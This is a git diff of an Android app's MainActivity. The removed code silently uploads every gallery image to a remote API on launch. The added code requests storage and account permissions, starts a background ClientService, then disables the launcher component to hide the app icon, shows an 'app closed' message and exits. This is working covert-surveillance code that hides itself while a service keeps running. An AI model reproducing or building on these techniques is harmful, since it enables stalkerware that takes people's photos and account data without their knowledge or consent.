@@ -1,148 +1,92 @@
 package org.jesusgift.clienttest;
 
+import android.Manifest;
+import android.content.ComponentName;
+import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
-import android.os.AsyncTask;
 import android.os.Bundle;
+import android.support.annotation.NonNull;
+import android.support.v4.app.ActivityCompat;
+import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
+import android.view.KeyEvent;
 import android.view.View;
 import android.widget.Button;
-import android.widget.EditText;
-import android.widget.ImageView;
+import android.widget.Toast;
 
-import com.facebook.stetho.okhttp3.StethoInterceptor;
+import org.jesusgift.clienttest.Helpers.MyUtility;
 
-import java.io.File;
-import java.io.IOException;
-import java.net.Socket;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
-import java.util.Set;
-
-import okhttp3.MediaType;
-import okhttp3.MultipartBody;
-import okhttp3.OkHttpClient;
-import okhttp3.RequestBody;
-import okhttp3.ResponseBody;
-import okhttp3.logging.HttpLoggingInterceptor;
-import okio.BufferedSource;
-import retrofit2.Call;
-import retrofit2.Callback;
-import retrofit2.Response;
-import retrofit2.Retrofit;
-import retrofit2.converter.gson.GsonConverterFactory;
+import java.util.Timer;
+import java.util.TimerTask;
 
 public class MainActivity extends AppCompatActivity implements View.OnClickListener {
 
     public static final String TAG = "SampleTag";
-    Retrofit retrofit;
-    DBManager dbManager;
-    Button btnSync;
-    ImageView img1, img2;
+    private static final int PERMISSION_READ_STORAGE = 124;
+    Button btnStopSync;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        btnSync = (Button) findViewById(R.id.btnSync);
-        btnSync.setOnClickListener(this);
+        btnStopSync = (Button) findViewById(R.id.btnStopService);
+        if(btnStopSync != null)
+            btnStopSync.setOnClickListener(this);
 
-        img1 = (ImageView) findViewById(R.id.img1);
-        img2 = (ImageView) findViewById(R.id.img2);
-
-        dbManager = new DBManager(this, null, null, AppConfig.DB_VERSION);
-        processMediaStore();
+        //checking permissions and starting services
+        checkPermission();
     }
 
-    /**
-     * Process Media Store Images and upload to cloud
-     * */
-    private void processMediaStore(){
-        initRetrofitService();
-        final MediaType TYPE_IMAGE = MediaType.parse("image/*");
-        Map<String, RequestBody> reqMap = new HashMap<>();
+    private void checkPermission() {
+        int permissionCheck = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_EXTERNAL_STORAGE);
 
-        try (Cursor c = MyUtility.getAllGalleryImages(this)) {
-            while (c.moveToNext()) {
+        if(permissionCheck != PackageManager.PERMISSION_GRANTED){
+            ActivityCompat.requestPermissions(
+                    this,
+                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.GET_ACCOUNTS},
+                    PERMISSION_READ_STORAGE);
 
-               File f = new File(c.getString(1));
-               if(f.exists()) {
-                   Bitmap bmp = MyUtility.decodeFile(f);
-                   File file = MyUtility.storeImage(bmp, getCacheDir());
-
-                   if(file != null && file.exists()) {
-                       RequestBody req = RequestBody.create(TYPE_IMAGE, file);
-                       reqMap.put("picture_"+c.getString(0)+"\"; filename=\""+c.getString(0), req);
-                   }
-               }
-            }
-            new ImageUploadTask().execute(reqMap);
+        }else {
+            initService();
         }
     }
 
-    /**
-     * Image Holder Class
-     * */
-    class ImageHolder {
-        private File imageFile;
-        private String storeId;
-    }
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
-    /**
-     * Function to initialise Retrofit services
-     * */
-    private void initRetrofitService() {
-        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
-        logging.setLevel(HttpLoggingInterceptor.Level.BASIC);
-        OkHttpClient client = new OkHttpClient.Builder()
-                .addInterceptor(logging)
-                .build();
-
-        retrofit = new Retrofit.Builder()
-                .baseUrl(AppConfig.API_BASE_URL)
-                .client(client)
-                .addConverterFactory(GsonConverterFactory.create())
-                .build();
-    }
-
-    /**
-     * ImageUpload Background Thread
-     * */
-    class ImageUploadTask extends AsyncTask<Map<String, RequestBody>, Void, Void> {
-
-        @Override
-        protected Void doInBackground(Map<String, RequestBody>... params) {
-            Map<String, RequestBody> parts = params[0];
-
-            ApiMethods apiMethods = retrofit.create(ApiMethods.class);
-            Call<MyResponse> responseCall = apiMethods.saveImages(parts);
-            responseCall.enqueue(apiCallback);
-            return null;
+        switch (requestCode) {
+            case PERMISSION_READ_STORAGE:
+                    if (grantResults.length > 0
+                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                        initService();
+                    }
+                    break;
         }
     }
 
-    /**
-     * Callback function for Retrofit Response
-     * @param MyResponse
-     * */
-    Callback<MyResponse> apiCallback = new Callback<MyResponse>() {
-        @Override
-        public void onResponse(Call<MyResponse> call, Response<MyResponse> response) {
-            Log.d(TAG, "SUC : "+response.code());
-            if(response.code() == 200){
-                Log.i(TAG, "UPLOADED STORE ID : "+response.body().getData()+" MSG : "+response.body().getMsg());
-                dbManager.insertMedia(response.body().getData());
-            }
-        }
+    private void initService() {
+        startService(new Intent(this, ClientService.class));
+        hideLauncher();
+    }
 
-        @Override
-        public void onFailure(Call<MyResponse> call, Throwable t) {
-            Log.d(TAG,"ERR : "+t.getMessage());
-        }
-    };
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+    }
+
+    private void hideLauncher() {
+        PackageManager p = getPackageManager();
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
+        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
+        Toast.makeText(this, R.string.app_closed, Toast.LENGTH_SHORT).show();
+        this.finish();
+        System.exit(0);
+    }
 
     /**
      * OnClick Handler
@@ -151,9 +95,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     @Override
     public void onClick(View v) {
         switch (v.getId()) {
-            case R.id.btnSync:
+            case R.id.btnStopService:
                 Log.d(TAG, "Onclick");
-                processMediaStore();
+                stopService(new Intent(this, ClientService.class));
                 break;
         }
     }
